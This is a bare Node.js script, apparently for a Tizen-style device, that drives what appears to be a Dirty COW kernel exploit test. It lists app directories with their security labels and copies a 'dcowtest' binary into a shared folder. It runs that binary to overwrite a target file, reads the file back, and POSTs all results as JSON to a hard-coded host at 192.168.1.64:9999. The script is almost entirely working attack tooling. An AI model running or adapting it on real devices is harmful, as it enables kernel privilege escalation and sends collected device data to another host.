"use strict";

var cp = require("child_process");
var http = require("http");

var HOST = "192.168.1.64";
var PORT = 9999;

function run(cmd, timeout) {
    try {
        return cp.execSync(cmd + " 2>&1", { encoding: "utf8", timeout: timeout || 25000 });
    } catch (e) {
        return "ERR " + (e.stdout ? e.stdout : e.message);
    }
}

function post(path, body) {
    var data = JSON.stringify(body);
    var req = http.request(
        {
            host: HOST,
            port: PORT,
            path: path,
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "Content-Length": Buffer.byteLength(data)
            }
        },
        function (res) {
            console.log("posted " + path + " -> " + res.statusCode);
        }
    );
    req.on("error", function (e) {
        console.log("post error " + e.message);
    });
    req.write(data);
    req.end();
}

var out = {};
out.started = new Date().toISOString();

out.appdir = run("ls -laZ /opt/usr/home/owner/apps_rw/xvvl3S1bvH/ 2>&1");
out.shareddir = run("ls -laZ /opt/usr/home/owner/apps_rw/xvvl3S1bvH/shared/ 2>&1");

out.copy = run("mkdir -p /opt/usr/home/owner/apps_rw/xvvl3S1bvH/shared/tmp; cat /tmp/dcowtest > /opt/usr/home/owner/apps_rw/xvvl3S1bvH/shared/tmp/dcowtest5; chmod 755 /opt/usr/home/owner/apps_rw/xvvl3S1bvH/shared/tmp/dcowtest5; ls -laZ /opt/usr/home/owner/apps_rw/xvvl3S1bvH/shared/tmp/ 2>&1");

out.dcow_self = run("printf 'CCCCCCCCCCCCCCCCCCCCCCCCCCCCC' > /opt/usr/home/owner/apps_rw/xvvl3S1bvH/shared/tmp/zzz_target; /opt/usr/home/owner/apps_rw/xvvl3S1bvH/shared/tmp/dcowtest5 /opt/usr/home/owner/apps_rw/xvvl3S1bvH/shared/tmp/zzz_target 2 0x42; echo rc=$?", 240000);

out.verify = run("cat /opt/usr/home/owner/apps_rw/xvvl3S1bvH/shared/tmp/zzz_target; echo; od -An -tx1 /opt/usr/home/owner/apps_rw/xvvl3S1bvH/shared/tmp/zzz_target | head -2");

post("/audit12", out);
